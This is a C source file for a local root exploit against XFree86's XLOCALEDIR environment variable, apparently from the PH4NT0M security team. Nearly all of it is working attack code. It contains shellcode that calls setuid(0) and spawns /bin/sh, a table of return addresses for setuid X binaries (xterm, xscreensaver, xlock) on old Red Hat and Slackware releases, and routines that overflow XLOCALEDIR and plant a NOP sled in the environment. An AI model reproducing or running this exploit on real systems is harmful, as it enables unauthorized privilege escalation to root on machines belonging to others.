/* XFree86 XLOCALEDIR env local root exploit
  coded by aXis@ph4nt0m.net
  PH4NT0M SECURITY TEAM

  bug is reported at  www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=4516
  this bug was founded by tarranta & dcryptr 3 january 2003
  dcryptr and angello have given exploits
  this exploit is base on that two exploits

  tested on REDHAT 9
  but there isn't a 's' for these two files.so we can't get a rootshell.
  
  just for fun!  

*/
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/errno.h>
#include <string.h>
#include <stdio.h>

//#define RET 0xbffffe50 // on rh9 ,RETADDR could be 0xbffff00---0xbffffe90  ===>tha's will be good!

char shellcode[]=
 "\x31\xdb"
"\x89\xd8"
"\xb0\x17"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\xb0\x17"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\xb0\x2e"
"\xcd\x80"
"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x31\xd2"
"\xb0\x0b"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\xb0\x01"
"\xcd\x80";

struct target{
  int num;
  char *version;
  char *dest;
  char *name;
  unsigned long ret;
  int bufsize;

};


struct target exploit[]={
  {1,"Redhat linux 9.0 --","/usr/X11R6/bin/xterm","xterm",0xbffffe50,4076},
  {2,"Redhat linux 9.0 --","/usr/X11R6/bin/xscreensaver","xscreensaver",0xbffffe50,4076},
 
  //this ret on rh7.3 is supplied by angelo rosiello
  {3,"Redhat linux 7.3 --","/usr/X11R6/bin/xscreensaver","xscreensaver",0xbfffdf20,4076},

  //these 3 ret on slackware followed is supplied by dcryptr
  {4,"Slackware 8.1 --","/usr/X11R6/bin/xscreensaver","xscreensaver",0xbfffe861,6000},
  {5,"Slackware 8.1 --","/usr/X11R6/bin/xterm","xterm",0xbfffe86d,6000},
  {6,"Slackware 8.1 --","/usr/X11R6/bin/xlock","xlock",0xbfffe86d,6000},    
  {0,NULL,NULL,NULL,0,0} 
};


void usage(char *c);

int main(int argc, char **argv){
  char buf[4076];
  int i; 
  int type;
  int options;
  int size;
  unsigned long ret;
  
  //options of the exploit
  while((options=getopt(argc,argv,"ht:"))!=-1){
    switch(options){
       case 'h':
	 usage(argv[0]);
         exit(0);
       case 't':
         type=atoi(optarg);
         
         if(type>6||type<0){
           printf("Wrong Target!\n\n");
           exit(0);
    
         }
     
         if(type==0){
	   usage(argv[0]);
           printf("Please select target num !\n");
           printf("======================================\n");
           for(i=0;exploit[i].dest;i++)
           fprintf(stderr,"[%d]  | %s  %s  \n",exploit[i].num,exploit[i].version,exploit[i].dest);
	     exit(1);
  

         }
	 break;
    default:
      usage(argv[0]);
      exit(0);      

     }

  }

  size=exploit[type-1].bufsize;
  ret=exploit[type-1].ret;
    
  //set the env to buf,first time.
  memset(buf,0x41,4072);
  memcpy(buf+2076,&ret,0x4);  //the value 2076 is knows form angelo roseillo's exploit
  setenv("XLOCALEDIR",buf,1);
  
  //buffer now has changed ,set env to buf for the second time!
  memset(buf,0x90,size); 
  memcpy(buf+4000+i,shellcode,strlen(shellcode));
  setenv("PH4NT0M",buf,1);


  printf("\n++++++++++++++++++++++++++++++\n");
  printf("Xfree86 XLOCALEDIR env local root exploit\n");
  printf("++++++++++++++++++++++++++++++++\n\n");
  printf("coded by aXis,aXis@ph4nt0m.net\n");
  printf("PST,www.ph4nt0m.org\n\n");  
  printf("retaddr is at 0x%lx  \n",ret);
  printf("buf is at 0x%lx \n",&buf);
  
  if(execl((exploit[type-1].dest),(exploit[type-1].name),0)==-1){
    fprintf(stderr,"failed,try another target! -h for help\n\n");
      exit(-1);
  }
  
  return 0;
} 

void usage(char *c){
  fprintf(stderr,"\n===XFree86 XLOCALEDIR env local root exploit====\n"
                             "====coded by aXis===========\n"
                             "====aXis@ph4nt0m.net\n"
                             "===PH4NT0M SECURITY TEAM      www.ph4nt0m.org===\n\n"
                             "usage: %s [-h] [-t <num>]\n"
                             "Options:\n"
                             "   -h:\t this help.\n"
	                     "   -t num:\t select the target type,try 0 for list\n\n",c);
  

}

